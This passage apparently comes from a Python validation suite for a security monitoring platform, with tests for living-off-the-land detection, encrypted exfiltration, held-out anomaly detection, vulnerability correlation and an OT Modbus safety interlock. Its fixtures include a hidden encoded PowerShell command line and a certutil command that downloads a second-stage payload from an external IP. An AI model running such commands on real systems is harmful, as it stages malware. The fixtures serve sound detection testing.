            "Suspicious Lateral Movement",
            _impl,
        )

    # ------------------------------------------------------------------
    # TEST 3: Living-off-the-Land (LOTL) Activity
    # ------------------------------------------------------------------
    def run_test_03_lotl_activity(self) -> ValidationResult:
        def _impl(ctx: _ScenarioContext) -> Tuple[str, Dict[str, Any]]:
            redis = _SyncRedisMock()
            db = _RecordingPostgresConn()
            event_ts = datetime(2026, 11, 18, 14, 20, 0, tzinfo=IST)

            # 15-minute network egress fetcher returning 1 external C2 flow + 1 internal flow
            def egress_fetcher(
                asset_id: Optional[str],
                src_ip: Optional[str],
                ts: datetime,
                window_min: int,
            ) -> List[Dict[str, Any]]:
                assert window_min == 15
                return [
                    {
                        "timestamp": (ts - timedelta(minutes=4)).isoformat(),
                        "src_ip": "10.10.10.23",
                        "dst_ip": "185.220.101.42",
                        "dst_port": 443,
                        "protocol": "TCP",
                    },
                    {
                        "timestamp": (ts - timedelta(minutes=2)).isoformat(),
                        "src_ip": "10.10.10.23",
                        "dst_ip": "10.10.10.4",  # internal SMB - must be excluded from external egress
                        "dst_port": 445,
                        "protocol": "TCP",
                    },
                ]

            lotl_detector = LotlDetector(
                redis_client=redis,
                network_fetcher=egress_fetcher,
            )

            # 1. Sysmon Event ID 1: Encoded PowerShell
            ps_ind = lotl_detector.analyze_event(
                {
                    "event_type": "process_create",
                    "event_id_raw": 1,
                    "asset_id": "CORP-WS-003",
                    "hostname": "corp-ws-003.becpl.in",
                    "user_name": "a.deshmukh",
                    "process_name": "powershell.exe",
                    "parent_process_name": "winword.exe",
                    "command_line": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
                    "timestamp": event_ts,
                },
                publish=True,
            )
            ctx.check(
                "powershell_encoded_detected_and_mapped",
                ps_ind is not None
                and "T1059.001" in ps_ind.mitre_techniques
                and ps_ind.network_correlated is True
                and len(ps_ind.external_connections) == 1,
                f"Encoded PowerShell mapped to {ps_ind.mitre_techniques if ps_ind else []}; correlated with 1 external egress flow",
            )

            # 2. Sysmon Event ID 1: CertUtil download
            cert_ind = lotl_detector.analyze_event(
                {
                    "event_type": "process_create",
                    "event_id_raw": 1,
                    "asset_id": "CORP-WS-003",
                    "hostname": "corp-ws-003.becpl.in",
                    "user_name": "a.deshmukh",
                    "process_name": "certutil.exe",
                    "parent_process_name": "cmd.exe",
                    "command_line": "certutil.exe -urlcache -split -f http://185.220.101.42/stage2.bin C:\\Temp\\svc.bin",
                    "timestamp": event_ts + timedelta(minutes=2),
                },
                publish=True,
            )
            ctx.check(
                "certutil_download_detected_and_mapped",
                cert_ind is not None
                and "T1105" in cert_ind.mitre_techniques
                and cert_ind.network_correlated is True
                and cert_ind.combined_score >= 0.80,
                f"CertUtil download mapped to {cert_ind.mitre_techniques if cert_ind else []}; score={cert_ind.combined_score if cert_ind else 0:.2f}",
            )

            # 3. Correlate LOTL indicator + external egress in CorrelationEngine (RULE-CORP-003)
            corr_engine = CorrelationEngine(db_client=db, redis_client=redis)
            corr_engine.ingest_event(
                "detections:lotl",
                {
                    "event_id": "lotl-ev-001",
                    "timestamp": event_ts.astimezone(timezone.utc).isoformat(),
                    "event_type": "lotl_indicator",
                    "source_asset_id": "CORP-WS-003",
                    "process_name": "powershell.exe",
                    "mitre_techniques": ps_ind.mitre_techniques if ps_ind else [],
                },
            )
            corr_res = corr_engine.ingest_event(
                "detections:anomaly",
                {
                    "event_id": "lotl-egress-001",
                    "timestamp": (
                        event_ts.astimezone(timezone.utc) + timedelta(minutes=5)
                    ).isoformat(),
                    "source_asset_id": "CORP-WS-003",
                    "destination_ip": "185.220.101.42",
                    "is_external": True,
                },
            )
            lotl_inc = next(
                (i for i in corr_res if i.rule_id == "RULE-CORP-003"), None
            )
            ctx.check(
                "lotl_chain_correlated_with_mitre",
                lotl_inc is not None
                and {"T1059", "T1041"}.issubset(set(lotl_inc.mitre_techniques)),
                f"Correlated {lotl_inc.incident_reference if lotl_inc else None} ({lotl_inc.rule_id if lotl_inc else None}) with MITRE {lotl_inc.mitre_techniques if lotl_inc else []}",
            )

            all_mitre = sorted(
                set((ps_ind.mitre_techniques if ps_ind else []))
                | set((cert_ind.mitre_techniques if cert_ind else []))
                | set((lotl_inc.mitre_techniques if lotl_inc else []))
            )
            return (
                f"Sysmon Event ID 1 encoded PowerShell & CertUtil download correlated with 15-min egress flows; MITRE techniques verified: {', '.join(all_mitre)}.",
                {
                    "powershell_mitre": ps_ind.mitre_techniques if ps_ind else [],
                    "certutil_mitre": cert_ind.mitre_techniques if cert_ind else [],
                    "correlated_incident_mitre": lotl_inc.mitre_techniques if lotl_inc else [],
                    "egress_window_minutes": 15,
                    "lotl_stream_events": len(redis.streams.get("detections:lotl", [])),
                },
            )

        return self._execute_scenario(
            "TEST-03",
            "Living-off-the-Land (LOTL) Activity",
            _impl,
        )

    # ------------------------------------------------------------------
    # TEST 4: Encrypted Data Transfer Without Decryption
    # ------------------------------------------------------------------
    def run_test_04_encrypted_exfil(self) -> ValidationResult:
        def _impl(ctx: _ScenarioContext) -> Tuple[str, Dict[str, Any]]:
            redis = _SyncRedisMock()
            db = _RecordingPostgresConn()
            enricher = _AssetLookupAdapter(
                {
                    "10.10.20.11": {
                        "asset_id": "ENG-WS-001",
                        "hostname": "eng-firmware-ws01",
                        "vlan": 20,
                        "network_segment": "Engineering",
                        "criticality": "critical",
                        "owner_department": "Engineering",
                    }
                }
            )
            analyzer = EncryptedTrafficAnalyzer(
                redis_client=redis,
                asset_enricher=enricher,
                blocklist_ips={"185.220.101.42": "tor_exit_node"},
                min_signals=2,
            )
            analyzer.seed_ja3_history(
                "10.10.20.11",
                "baseline_approved_ja3_001",
                seen_at=datetime(2026, 11, 10, 10, 0, tzinfo=timezone.utc),
            )

            # 1. Emit 4.5-hour (16,200s) TLS 1.3 flow with >0.99 upload ratio & NO payload
            bytes_up = 120_000_000
            bytes_down = 800_000
            upload_ratio = bytes_up / (bytes_up + bytes_down)  # 0.993377 > 0.99
            exfil_flow = {
                "flow_id": "flow-tls13-exfil-45h",
                "src_ip": "10.10.20.11",
                "dst_ip": "185.220.101.42",
                "src_port": 59443,
                "dst_port": 443,
                "protocol": "TLS",
                "flow_duration": 4.5 * 3600.0,  # 4.5 hours
                "bytes_up": bytes_up,
                "bytes_down": bytes_down,
                "packet_count": 91_200,
                "timestamp": "2026-11-18T03:45:00Z",
                "tls_metadata": {
                    "tls_version": "TLSv1.3",
                    "ja3_hash": "unseen_exfil_ja3_deadbeef",
                    "cert_validity_days": 7,
                    "self_signed": True,
                    "sni": "firmware-sync-cdn.invalid",
                },
            }
            ctx.check(
                "zero_payload_decryption_input",
                "payload" not in exfil_flow and upload_ratio > 0.99,
                f"Upload ratio={upload_ratio:.4f} (>0.99), duration=4.5h, TLSv1.3, payload absent",
            )

            res_exfil = analyzer.analyze_flow(exfil_flow)
            sig_names = {s.signal_name for s in res_exfil.signals}
            ctx.check(
                "encrypted_exfil_detected_without_decryption",
                res_exfil.triggered_finding
                and res_exfil.published
                and res_exfil.metadata_visibility == "full_tls"
                and "high_upload_ratio" in sig_names
                and "long_duration_unseen_external" in sig_names
                and "large_volume_critical_asset" in sig_names
                and "unseen_ja3_fingerprint" in sig_names,
                f"Triggered {res_exfil.signal_count} metadata signals without decryption: {sorted(sig_names)}",
            )

            # 2. C2 Beacon interval autocorrelation (periodic 60s +/- 0.5s intervals)
            beacon_start = datetime(2026, 11, 18, 4, 0, 0, tzinfo=timezone.utc)
            beacon_ts = [
                (beacon_start + timedelta(seconds=i * 60 + (i % 2) * 0.5)).timestamp()
                for i in range(10)
            ]
            autocorr = compute_beacon_autocorrelation(beacon_ts)
            last_beacon_res = None
            for idx, ts_val in enumerate(beacon_ts):
                last_beacon_res = analyzer.analyze_flow(
                    {
                        "flow_id": f"flow-c2-beacon-{idx}",
                        "src_ip": "10.10.20.11",
                        "dst_ip": "45.33.32.156",
                        "src_port": 54000 + idx,
                        "dst_port": 443,
                        "protocol": "TLS",
                        "flow_duration": 1.8,
                        "bytes_up": 640,
                        "bytes_down": 512,
                        "packet_count": 10,
                        "timestamp": datetime.fromtimestamp(
                            ts_val, tz=timezone.utc
                        ).isoformat(),
                    }
                )
            ctx.check(
                "c2_beacon_autocorrelation_detected",
                autocorr["is_beacon"]
                and autocorr["correlation"] >= 0.70
                and last_beacon_res is not None
                and "c2_beacon_pattern"
                in {s.signal_name for s in last_beacon_res.signals},
                f"C2 beacon autocorrelation={autocorr['correlation']:.3f} (>=0.70), signal c2_beacon_pattern fired",
            )

            # 3. Correlate into RULE-EXFIL-001 incident
            corr_engine = CorrelationEngine(db_client=db, redis_client=redis)
            inc_res = corr_engine.ingest_event(
                "detections:encrypted_traffic",
                {
                    "event_id": "enc-exfil-001",
                    "timestamp": "2026-11-18T03:45:00+00:00",
                    "source_asset_id": "ENG-WS-001",
                    "destination_ip": "185.220.101.42",
                    "upload_ratio": upload_ratio,
                    "bytes_out": bytes_up,
                    "asset_criticality": "critical",
                },
            )
            exfil_inc = next(
                (i for i in inc_res if i.rule_id == "RULE-EXFIL-001"), None
            )
            ctx.check(
                "exfil_incident_correlated",
                exfil_inc is not None and exfil_inc.severity == "high",
                f"Correlated {exfil_inc.incident_reference if exfil_inc else None} via RULE-EXFIL-001",
            )

            return (
                f"TLS 1.3 4.5h exfiltration (upload ratio {upload_ratio:.4f}) and C2 beacon (r={autocorr['correlation']:.3f}) detected purely from encrypted flow metadata.",
                {
                    "upload_ratio": round(upload_ratio, 4),
                    "flow_duration_hours": 4.5,
                    "tls_version": "TLSv1.3",
                    "payload_decrypted": False,
                    "signals_triggered": sorted(sig_names),
                    "beacon_autocorrelation": round(float(autocorr["correlation"]), 4),
                    "correlation_rule": exfil_inc.rule_id if exfil_inc else None,
                },
            )

        return self._execute_scenario(
            "TEST-04",
            "Encrypted Data Transfer Without Decryption",
            _impl,
        )

    # ------------------------------------------------------------------
    # TEST 5: Unknown Attack Behaviour (Held-Out Attack Family)
    # ------------------------------------------------------------------
    def run_test_05_unknown_attack_heldout(self) -> ValidationResult:
        def _impl(ctx: _ScenarioContext) -> Tuple[str, Dict[str, Any]]:
            redis = _SyncRedisMock()

            ctx.check(
                "training_dataset_available",
                self.dataset_path.exists(),
                f"Loaded dataset {self.dataset_path.name}",
            )
            df = pd.read_csv(self.dataset_path)

            def _encode_matrix(frame: pd.DataFrame) -> np.ndarray:
                work = frame[FEATURE_COLUMNS].copy()
                work["protocol"] = (
                    work["protocol"]
                    .astype(str)
                    .str.upper()
                    .map(lambda v: PROTOCOL_ENCODING.get(v, 9))
                )
                work["identity_classification"] = (
                    work["identity_classification"]
                    .astype(str)
                    .str.upper()
                    .map(lambda v: IDENTITY_ENCODING.get(v, 6))
                )
                return work.apply(pd.to_numeric, errors="coerce").fillna(0.0).to_numpy(dtype=np.float64)

            # 1. Held-out attack family split: train Isolation Forest EXCLUSIVELY on BENIGN traffic
            #    Intentionally withhold ENCRYPTED_EXFIL and VENDOR_COMPROMISE (and all attacks) from training
            benign_df = df[df["label"] == "BENIGN"]
            benign_train = benign_df.iloc[:4000]
            benign_holdout = benign_df.iloc[4000:5000]

            held_out_families = ["ENCRYPTED_EXFIL", "VENDOR_COMPROMISE", "LOTL", "SERVICE_MISUSE"]
            held_out_frames = {
                fam: df[df["label"] == fam].head(300) for fam in held_out_families
            }

            scaler = StandardScaler()
            X_train_benign = scaler.fit_transform(_encode_matrix(benign_train))
            iso_forest = IsolationForest(
                n_estimators=150,
                contamination=0.10,
                random_state=42,
                n_jobs=1,
            )
            iso_forest.fit(X_train_benign)

            # 2. Evaluate unsupervised detection rate on each held-out attack family
            X_benign_test = scaler.transform(_encode_matrix(benign_holdout))
            benign_preds = iso_forest.predict(X_benign_test)
            benign_fpr = float(np.mean(benign_preds == -1))

            per_family_recall: Dict[str, float] = {}
            total_held_out_samples = 0
            total_held_out_detected = 0
            for fam, fam_df in held_out_frames.items():
                X_fam = scaler.transform(_encode_matrix(fam_df))
                preds = iso_forest.predict(X_fam)
                detected = int(np.sum(preds == -1))
                total_held_out_samples += len(preds)
                total_held_out_detected += detected
                per_family_recall[fam] = round(detected / max(1, len(preds)), 4)

            overall_heldout_recall = total_held_out_detected / max(1, total_held_out_samples)
            ctx.check(
                "held_out_attack_detection_measured",
                per_family_recall.get("ENCRYPTED_EXFIL", 0.0) >= 0.90
                and overall_heldout_recall >= 0.20
                and benign_fpr <= 0.15,
                f"Held-out overall recall={overall_heldout_recall:.2%}, ENCRYPTED_EXFIL={per_family_recall.get('ENCRYPTED_EXFIL', 0):.2%}, benign FPR={benign_fpr:.2%}",
            )

            # 3. Verify AnomalyDetector wrapper + v1 artifact + non-alert invariant + explainability
            detector = AnomalyDetector(
                model_object=iso_forest,
                scaler_object=scaler,
                redis_client=redis,
                investigation_rate_threshold=0.5,
                investigation_min_samples=3,
            )
            sample_exfil_rows = held_out_frames["ENCRYPTED_EXFIL"].head(5)
            last_result = None
            for idx, (_, row) in enumerate(sample_exfil_rows.iterrows()):
                last_result = detector.score(
                    row[FEATURE_COLUMNS].to_dict(),
                    event_id=f"heldout-exfil-{idx}",
                    asset_id="ENG-WS-001",
                    zone="Engineering",
                    now=1000.0 + idx,
                    publish=True,
                )
            ctx.check(
                "anomaly_detector_never_auto_alerts_and_explains",
                last_result is not None
                and last_result.is_anomaly is True
                and last_result.creates_alert is False
                and len(last_result.anomalous_features) > 0
                and last_result.investigation_suggestion is not None
                and last_result.investigation_suggestion.get("auto_alert") is False,
                "AnomalyDetector emitted explainable anomaly evidence and investigation suggestion with creates_alert=False",
            )

            return (
                f"Unsupervised Isolation Forest achieved {overall_heldout_recall:.1%} overall recall across 4 held-out attack families ({per_family_recall['ENCRYPTED_EXFIL']:.1%} on ENCRYPTED_EXFIL) at {benign_fpr:.1%} benign FPR with zero auto-alerts.",
                {
                    "benign_train_samples": len(benign_train),
                    "benign_holdout_fpr": round(benign_fpr, 4),
                    "overall_held_out_recall": round(overall_heldout_recall, 4),
                    "per_family_recall": per_family_recall,
                    "creates_alert_invariant_preserved": True,
                    "top_anomalous_feature": (
                        last_result.anomalous_features[0]["feature"]
                        if last_result and last_result.anomalous_features
                        else None
                    ),
                },
            )

        return self._execute_scenario(
            "TEST-05",
            "Unknown Attack Behaviour (Held-Out Attack Family)",
            _impl,
        )

    # ------------------------------------------------------------------
    # TEST 6: Vulnerability Exposure & Exploitation Indicators
    # ------------------------------------------------------------------
    def run_test_06_vulnerability_exploitation_ladder(self) -> ValidationResult:
        def _impl(ctx: _ScenarioContext) -> Tuple[str, Dict[str, Any]]:
            redis = _SyncRedisMock()
            db = _RecordingPostgresConn()

            # 1. Load threat intel feeds & run VulnerabilityEngine across all BECPL assets
            feeds = ThreatIntelFeedManager(redis_client=redis)
            vuln_engine = VulnerabilityEngine(
                feed_manager=feeds, db_client=db, redis_client=redis
            )
            findings = vuln_engine.scan_all_assets(publish=True)
            matched = {(f.asset_id, f.cve_id): f for f in findings}

            expected_4 = [
                ("CORP-WS-004", "CVE-2020-0796"),       # SMBGhost
                ("ENG-WS-002", "CVE-2016-10009"),        # OpenSSH 7.4
                ("MES-SERVER", "CVE-2018-1000656"),      # Flask 1.0
                ("FIRMWARE-STORAGE", "CVE-2019-9511"),   # Nginx 1.14
            ]
            all_4_found = all(pair in matched for pair in expected_4)
            ctx.check(
                "all_4_vulnerable_assets_correlated",
                all_4_found,
                f"Matched all 4 intentionally vulnerable assets ({len(findings)} total findings)",
            )

            smbghost = matched[("CORP-WS-004", "CVE-2020-0796")]
            ctx.check(
                "smbghost_kev_and_risk_score_verified",
                smbghost.is_kev is True and abs(smbghost.risk_score - 15.0) < 1e-6,
                f"CORP-WS-004 CVE-2020-0796 is_kev=True, risk_score={smbghost.risk_score}",
            )

            # 2. Advance through the 4-stage ExploitationCorrelator ladder
            correlator = ExploitationCorrelator(db_client=db, redis_client=redis)

            # Stage 1: EXPOSED (VULNERABILITY_EXPOSED)
            s1 = correlator.process_event("intel:vulnerabilities", smbghost.to_dict())[0]
            stage_1_val = s1.stage.value
            ctx.check(
                "stage_1_exposed",
                s1.stage == ExploitationStage.VULNERABILITY_EXPOSED,
                f"Stage 1 reached: {stage_1_val}",
            )

            # Stage 2: ATTACK_ATTEMPT (ATTACK_ATTEMPT_DETECTED)
            s2 = correlator.process_event(
                "detections:signature",
                {
                    "event_id": "probe-smbghost-001",
                    "destination_asset_id": "CORP-WS-004",
                    "destination_port": 445,
                    "detection_source": "suricata",
                    "signature": "ET EXPLOIT Possible CVE-2020-0796 SMBGhost Compression Buffer Overflow",
                },
            )[0]
            stage_2_val = s2.stage.value
            ctx.check(
                "stage_2_attack_attempt",
                s2.stage == ExploitationStage.ATTACK_ATTEMPT_DETECTED,
                f"Stage 2 reached: {stage_2_val}",
            )

            # Stage 3: POTENTIAL_EXPLOITATION (network anomaly + endpoint process indicator; NO auto-confirm)
            correlator.process_event(
                "detections:anomaly",
                {
                    "event_id": "anom-smbghost-001",
                    "destination_asset_id": "CORP-WS-004",
                    "destination_port": 445,
                    "anomaly_type": "smb_compression_burst",
                },
            )
            s3 = correlator.process_event(
                "detections:lotl",
                {
                    "event_id": "sysmon-smbghost-001",
                    "asset_id": "CORP-WS-004",
                    "event_type": "process_create",
                    "process_name": "cmd.exe",
                },
            )[0]
            stage_3_val = s3.stage.value
            ctx.check(
                "stage_3_potential_exploitation_no_auto_confirm",
                s3.stage == ExploitationStage.POTENTIAL_EXPLOITATION
                and s3.stage != ExploitationStage.CONFIRMED_COMPROMISE,
                f"Stage 3 reached: {stage_3_val} (auto-escalation to CONFIRMED_COMPROMISE blocked)",
            )

            # Stage 4: CONFIRMED_COMPROMISE (analyst manual confirmation only)
            s4 = correlator.confirm_compromise(
                asset_id="CORP-WS-004",
                cve_id="CVE-2020-0796",
                analyst_id="soc_lead_pune",
                notes="Verified SMBv3 kernel pool corruption and spawned shell",
            )
            stage_4_val = s4.stage.value
            ctx.check(
                "stage_4_confirmed_compromise_manual_only",
                s4.stage == ExploitationStage.CONFIRMED_COMPROMISE
                and s4.confirmed_by_analyst == "soc_lead_pune",
                f"Stage 4 reached via analyst confirmation: {stage_4_val}",
            )

            # 3. Verify RULE-SCAN-001 KEV severity escalation in CorrelationEngine
            corr_engine = CorrelationEngine(db_client=db, redis_client=redis)
            t0 = datetime(2026, 11, 18, 11, 0, 0, tzinfo=timezone.utc)
            corr_engine.ingest_event(
                "detections:signature",
                {
                    "event_id": "scan-ev-01",
                    "timestamp": t0.isoformat(),
                    "event_type": "port_scan_pattern",
                    "source_asset_id": "CORP-WS-002",
                    "destination_asset_id": "CORP-WS-004",
                    "distinct_ports_scanned": 48,
                },
            )
            scan_inc_list = corr_engine.ingest_event(
                "intel:exploitation",
                {
                    "event_id": "kev-ev-01",
                    "timestamp": (t0 + timedelta(minutes=1)).isoformat(),
                    "asset_id": "CORP-WS-004",
                    "cve_id": "CVE-2020-0796",
                    "is_kev": True,
                },
            )
            scan_inc = next(
                (i for i in scan_inc_list if i.rule_id == "RULE-SCAN-001"), None
            )
            ctx.check(
                "rule_scan_001_kev_escalation",
                scan_inc is not None and scan_inc.severity == "high",
                f"RULE-SCAN-001 escalated CISA KEV target to severity={scan_inc.severity if scan_inc else None}",
            )

            return (
                "All 4 intentionally vulnerable BECPL assets correlated and progressed cleanly through the 4-stage exploitation ladder.",
                {
                    "vulnerable_assets_matched": [f"{a}:{c}" for a, c in expected_4],
                    "ladder_progression": [
                        stage_1_val,
                        stage_2_val,
                        stage_3_val,
                        stage_4_val,
                    ],
                    "smbghost_risk_score": smbghost.risk_score,
                    "kev_escalated_severity": scan_inc.severity if scan_inc else None,
                },
            )

        return self._execute_scenario(
            "TEST-06",
            "Vulnerability Exposure & Exploitation Indicators",
            _impl,
        )

    # ------------------------------------------------------------------
    # TEST 7: Industrial Network Anomaly (Modbus Safety Interlock)
    # ------------------------------------------------------------------
    def run_test_07_industrial_modbus_safety(self) -> ValidationResult:
        def _impl(ctx: _ScenarioContext) -> Tuple[str, Dict[str, Any]]:
            redis = _SyncRedisMock()
            db = _RecordingPostgresConn()
            t0 = datetime(2026, 11, 18, 12, 30, 0, tzinfo=timezone.utc)

            # 1. Emit Suricata alert for unauthorized Modbus FC6 write to holding register 40003
            enricher = _AssetLookupAdapter(
                {
                    "10.10.10.24": {
                        "asset_id": "CORP-WS-004",
                        "hostname": "corp-ws-004",
                        "vlan": 10,
                        "network_segment": "Corporate IT",
                        "criticality": "high",
                    },
                    "10.10.30.10": {
                        "asset_id": "OT-PLC-SMTA-01",
                        "hostname": "plc-smt-line-a",
                        "vlan": 30,
                        "network_segment": "Manufacturing OT",
                        "criticality": "critical",
                    },
                }
            )
            sig_engine = SignatureEngine(
                redis_client=redis, asset_enricher=enricher
            )
            sig_det = sig_engine.process_event(
                {
                    "timestamp": t0.isoformat(),
                    "event_type": "alert",
                    "src_ip": "10.10.10.24",
                    "dest_ip": "10.10.30.10",
                    "src_port": 54912,
                    "dest_port": 502,
                    "proto": "TCP",
                    "alert": {
                        "signature_id": 2026502,
                        "signature": "BECPL Unauthorized Modbus FC6 Write Holding Register 40003 (Conveyor Speed Setpoint)",
                        "category": "OT Protocol Violation",
                        "severity": 1,
                    },
                },
                now=1000.0,
            )
            ctx.check(
                "modbus_fc6_signature_detected",
                sig_det is not None and sig_det.severity == "critical",
                "Suricata SignatureEngine detected critical Modbus FC6 write to register 40003",
            )

            # 2. Trigger RULE-OT-001 in CorrelationEngine with OT_SAFETY_FLAG=True
            corr_engine = CorrelationEngine(db_client=db, redis_client=redis)
            inc_res = corr_engine.ingest_event(
                "detections:signature",
                {
                    "event_id": "ot-modbus-fc6-40003",
                    "timestamp": t0.isoformat(),
                    "source_asset_id": "CORP-WS-004",
                    "destination_asset_id": "OT-PLC-SMTA-01",
                    "source_vlan": 10,
                    "destination_vlan": 30,
                    "protocol": "Modbus",
                    "destination_port": 502,
                    "modbus_function_code": 6,
                    "modbus_register": 40003,
                },
            )
            ot_inc = next((i for i in inc_res if i.rule_id == "RULE-OT-001"), None)
            ctx.check(
                "rule_ot_001_triggered_with_safety_flag",
                ot_inc is not None
                and ot_inc.severity == "critical"
                and ot_inc.ot_safety_flag is True
                and "T0855" in ot_inc.mitre_techniques,
                f"Triggered {ot_inc.incident_reference if ot_inc else None} ({ot_inc.rule_id if ot_inc else None}), ot_safety_flag=True, MITRE T0855",
            )
            assert ot_inc is not None

            # 3. Verify OT_ALWAYS_HUMAN_APPROVAL is immutable and blocks MODE 4 auto-isolation
            config = ContainmentConfig()
            invariant_enforced = False
            try:
                config.ot_always_human_approval = False
            except SafetyInvariantViolationError:
                invariant_enforced = True
            ctx.check(
                "ot_safety_invariant_immutable",
                OT_ALWAYS_HUMAN_APPROVAL is True and invariant_enforced,
                "OT_ALWAYS_HUMAN_APPROVAL safety invariant cannot be disabled",
            )

            policy_engine = ContainmentPolicyEngine(config=config, db_conn=db)
            policy_engine.set_mode(
                ContainmentMode.PRE_APPROVED_AUTOMATION,
                Role.ADMIN,
                "admin@becpl.in",
                reason="Stress-testing OT safety interlock under MODE 4",
            )
            plc_asset = AffectedAsset(
                asset_id="OT-PLC-SMTA-01",
                hostname="plc-smt-line-a",
                vlan_id=30,
                criticality="critical",
                device_type="plc",
                ip_address="10.10.30.10",
            )
            ot_proposal = policy_engine.propose_action(
                incident_id=uuid.UUID(ot_inc.incident_id),
                affected_asset=plc_asset,
                action_category=ActionCategory.OT_BOUNDARY_RESTRICTION,
                reason_for_isolation="Unauthorized Modbus FC6 write to holding register 40003 (conveyor speed)",
                supporting_evidence=["ot-modbus-fc6-40003"],
                parameters={"ot_target_ip": "10.10.30.10", "register": 40003},
                template_id="TPL-BLOCK-KNOWN-C2-IT",
            )
            ctx.check(
                "automated_isolation_blocked_by_ot_safety_flag",
                ot_proposal.execution_status == ActionStatus.PENDING.value
                and ot_proposal.ot_safety_override_applied is True
                and ot_proposal.two_person_rule_required is True,
                "MODE 4 automation BLOCKED; forced to pending with Two-Person Rule required",
            )

            # 4. Enforce Two-Person human approval (SECURITY_MANAGER + distinct APPROVER)
            approval_engine = ApprovalEngine(
                policy_engine=policy_engine,
                db_conn=db,
                redis_client=redis,
                config=config,
                identities=_seed_soc_identities(),
            )
            first_sig = approval_engine.approve_action(
                action_id=ot_proposal.action_id,
                approver_identity="ciso@becpl.in",
                approver_role=Role.SECURITY_MANAGER,
                mfa_token="100502",
            )
            ctx.check(
                "first_approval_awaits_second_person",
                first_sig.approved is False
                and first_sig.awaiting_second_approver is True
                and first_sig.status == ActionStatus.PENDING.value,
                "1st approval by SECURITY_MANAGER held in pending awaiting 2nd distinct approver",
            )

            same_signer_blocked = False
            try:
                approval_engine.approve_action(
                    action_id=ot_proposal.action_id,
                    approver_identity="ciso@becpl.in",
                    approver_role=Role.SECURITY_MANAGER,
                    mfa_token="100503",
                )
            except AuthorizationError:
                same_signer_blocked = True
            ctx.check(
                "same_signer_blocked_two_person_rule",
                same_signer_blocked,
                "Duplicate signer blocked by Two-Person Rule",
            )

            second_sig = approval_engine.approve_action(
                action_id=ot_proposal.action_id,
                approver_identity="approver1@becpl.in",
                approver_role=Role.APPROVER,
                mfa_token="100504",
            )
            ctx.check(
                "two_person_approval_completed",
                second_sig.approved is True
                and second_sig.status == ActionStatus.APPROVED.value
                and second_sig.approved_by == "ciso@becpl.in"
                and second_sig.second_approver == "approver1@becpl.in",
                "Two-Person approval completed by ciso@becpl.in + approver1@becpl.in",
            )

            # 5. Safe OT boundary execution + rollback via OTBoundaryAdapter
            ot_adapter = OTBoundaryAdapter()
            executor = ContainmentActionExecutor(
                policy_engine=policy_engine,
                approval_engine=approval_engine,
                adapters={ActionCategory.OT_BOUNDARY_RESTRICTION: ot_adapter},
                db_conn=db,
                redis_client=redis,
            )
            exec_res = executor.execute_action(ot_proposal.action_id)
            rb_res = executor.rollback_action(
                ot_proposal.action_id,
                actor_identity="ciso@becpl.in",
                reason="OT engineer verified conveyor PLC safety",
            )
            ctx.check(
                "ot_boundary_enforced_and_rolled_back",
                exec_res.success and rb_res.success,
                "OTBoundaryAdapter enforced Modbus restriction after two-person signoff and rolled back safely",
            )

            return (
                "Unauthorized Modbus FC6 write (reg 40003) triggered RULE-OT-001; MODE 4 auto-isolation blocked by OT safety interlock and enforced Two-Person MFA approval.",
                {
                    "incident_reference": ot_inc.incident_reference,
                    "correlation_rule": ot_inc.rule_id,
                    "modbus_function_code": 6,
                    "holding_register": 40003,
                    "ot_safety_override_applied": ot_proposal.ot_safety_override_applied,
                    "two_person_approvers": [
                        second_sig.approved_by,
                        second_sig.second_approver,
                    ],
                },
            )

        return self._execute_scenario(
            "TEST-07",
            "Industrial Network Anomaly (Modbus Safety Interlock)",
            _impl,
        )

    # ------------------------------------------------------------------
    # TEST 8: High Network Load Stress Test
    # ------------------------------------------------------------------
    def run_test_08_high_load_stress_test(self) -> ValidationResult:
        def _impl(ctx: _ScenarioContext) -> Tuple[str, Dict[str, Any]]:
            tester = StressTester(
                seed=42,
                backpressure_threshold=500,
                model_dir=self.model_dir,
            )
            bench = tester.run_benchmark(
                num_flows=self.stress_flow_count,
                burst_size=250,
            )

            ctx.check(
                "all_synthetic_flows_processed_zero_errors",
                bench.flows_processed == self.stress_flow_count
                and len(bench.errors) == 0,
                f"Processed {bench.flows_processed}/{self.stress_flow_count} flows with 0 errors",
            )
            ctx.check(
                "throughput_fps_and_pps_measured",
                bench.fps > 100.0 and bench.pps > 1000.0,
                f"FPS={bench.fps:.1f}, PPS={bench.pps:.1f}, ML_FPS={bench.ml_inference_fps:.1f}",
            )
            ctx.check(
                "latency_percentiles_within_sla",
                bench.latency.p50_ms > 0.0
                and bench.latency.p95_ms >= bench.latency.p50_ms
                and bench.latency.p99_ms >= bench.latency.p95_ms
                and bench.latency.p99_ms < 100.0,
                f"Latency P50={bench.latency.p50_ms:.3f}ms, P95={bench.latency.p95_ms:.3f}ms, P99={bench.latency.p99_ms:.3f}ms",
            )
            ctx.check(
                "queue_depth_and_memory_measured",
                bench.memory_peak_mb > 0.0 and bench.memory_peak_mb < 1024.0,
                f"Peak queue depth={bench.peak_queue_depth}, Peak traced memory={bench.memory_peak_mb:.2f} MB",
            )

            return (
                f"Ingested & scored {bench.flows_processed:,} burst flows at {bench.fps:,.1f} FPS / {bench.pps:,.1f} PPS (P50={bench.latency.p50_ms:.2f}ms, P95={bench.latency.p95_ms:.2f}ms, P99={bench.latency.p99_ms:.2f}ms, Peak Mem={bench.memory_peak_mb:.1f} MB).",
                bench.to_dict(),
            )

        return self._execute_scenario(
            "TEST-08",
            "High Network Load Stress Test",
            _impl,
        )

    # ------------------------------------------------------------------
    # TEST 9: Human vs Service vs Agent Identity Classification
    # ------------------------------------------------------------------
    def run_test_09_identity_classification(self) -> ValidationResult:
        def _impl(ctx: _ScenarioContext) -> Tuple[str, Dict[str, Any]]:
            sync_redis = _SyncRedisMock()
            async_redis = _AsyncRedisMock()

            # 1. Seed all 7 identity categories in IdentityEngine & AssetIdentityEnricher
            identity_registry = {
                "rahul.sharma": {
                    "identity_id": str(uuid.uuid4()),
                    "principal_name": "rahul.sharma",
                    "principal_type": "HUMAN_USER",
                    "is_privileged": False,
                },
                "svc_erp_sync": {
                    "identity_id": str(uuid.uuid4()),
                    "principal_name": "svc_erp_sync",
                    "principal_type": "SERVICE_ACCOUNT",
                    "is_privileged": False,
                },
                "ci_firmware_runner": {
                    "identity_id": str(uuid.uuid4()),
                    "principal_name": "ci_firmware_runner",
                    "principal_type": "AUTOMATION_WORKLOAD",
                    "is_privileged": False,
                },
                "agent_procurement_ai": {
                    "identity_id": str(uuid.uuid4()),
